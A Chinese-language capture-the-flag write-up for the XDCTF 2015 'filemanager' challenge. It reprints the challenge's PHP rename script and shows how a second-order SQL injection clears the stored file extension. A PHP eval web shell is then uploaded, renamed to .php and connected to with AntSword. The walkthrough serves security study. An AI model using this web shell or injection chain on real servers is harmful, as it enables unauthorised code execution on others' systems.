---
title: '[XDCTF 2015]filemanager'
date: 2024-11-04 19:06:31
tags:
       - 文件上传
       - sql注入
categories: 刷题笔记
---

# XDCTF 2015 Filemanager

我们扫描目录发现一个/www.tar.gz

我们找到数据库的字段结构

![image-20241104193444339](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411041934441.png)

common

- 对传入的参数进行了addslashes()转义
- 数据库连接和遍历数组
- 基本没有直接的注入漏洞 

upload

- 白名单限制了后缀名为gif，jpg，png，zip，txt
- 查询文件名是否存在，进行了addslashes()转义
- 也不存在直接注入漏洞

delete

- 就是删除，没什么好讲

所以我们无法上传恶意文件，由于版本限制，也不能使用%00截断，但我们发现有个rename功能

```php+HTML
<?php
/**
 * Created by PhpStorm.
 * User: phithon
 * Date: 15/10/14
 * Time: 下午9:39
 */

require_once "common.inc.php";

//isset函数是检测变量是否设置
if (isset($req['oldname']) && isset($req['newname'])) {
    //先查询数据库中是否已存在旧文件名
    $result = $db->query("select * from `file` where `filename`='{$req['oldname']}'");
    if ($result->num_rows > 0) {
        $result = $result->fetch_assoc();
    } else {
        exit("old file doesn't exists!");
    }

    if ($result) {

        //basename() 函数返回路径中的包含后缀的文件名部分。
        $req['newname'] = basename($req['newname']); 
        
        //更新数据库中的旧文件名（不包含后缀的文件名）为新文件名（包含后缀的文件名）
        $re = $db->query("update `file` set `filename`='{$req['newname']}', `oldname`='{$result['filename']}' where `fid`={$result['fid']}");
        if (!$re) {
            print_r($db->error);
            exit;
        }
        //更新服务器上的旧文件名为：数据库中的新文件名（包含后缀）+数据库中的旧扩展名
        //更新服务器上的新文件名为：客户端输入的新文件名（包含后缀）+数据库中的旧扩展名
        //因此，在这里，我们可以先把数据库中的旧扩展名置为空，然后rename时，把新文件名设置为test.php
        $oldname = UPLOAD_DIR . $result["filename"] . $result["extension"];
        $newname = UPLOAD_DIR . $req["newname"] . $result["extension"];
        if (file_exists($oldname)) {
            rename($oldname, $newname);
        }
        $url = "/" . $newname;
        echo "Your file is rename, url:
                <a href=\"{$url}\" target='_blank'>{$url}</a><br/>
                <a href=\"/\">go back</a>";
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>file manage</title>
    <base href="/">
    <meta charset="utf-8" />
</head>
<h3>Rename</h3>
<body>
<form method="post">
    <p>
        <span>old filename(exclude extension)：</span>
        <input type="text" name="oldname">
    </p>
    <p>
        <span>new filename(exclude extension)：</span>
        <input type="text" name="newname">
    </p>
    <p>
        <input type="submit" value="rename">
    </p>
</form>
</body>
</html>
```

只能修改文件名，但我们可以通过sql注入，影响extension为空，然后在修改文件的时候加上.php后缀

![image-20241104193831525](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411041938570.png)

但还有个坑，这里改名的时候检查了文件是否存在：if(file_exists($oldname))。虽然通过注入修改了filename的值，但upload目录下上传的文件名是没有改的。 因为利用注入将extension改为空了，那么实际上数据库中的filename总比文件系统中真实的文件名少一个后缀。 那么这里的file_exists就验证不过。怎么办？ 简单啊，再次上传一个新文件，这个文件名就等于数据库里的filename的值就好了。

我们先上传一个用来sql注入的文件

![image-20241104195257834](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411041952870.png)

然后修改文件名

![image-20241104195408119](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411041954148.png)

我们就得到了一个新的文件名test.txt.txt，但是数据库中经过update语句

```mysql
update `file` set `filename`='test.txt', `oldname`='',extension='' where `fid`={$result['fid']}
```

实际上，下文件的filename为test.txt，extension为空

然后我们在上传一个和上面newname文件名相同的木马文件

```
<?php eval($_POST[1]); ?>
```

![image-20241104195733370](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411041957401.png)

然后我们重命名文件为test.php

![image-20241104195915574](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411041959621.png)

我们访问/upload/test.php，通过蚁剑进行连接，得到flag

**![image-20241104200024606](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411042000661.png)
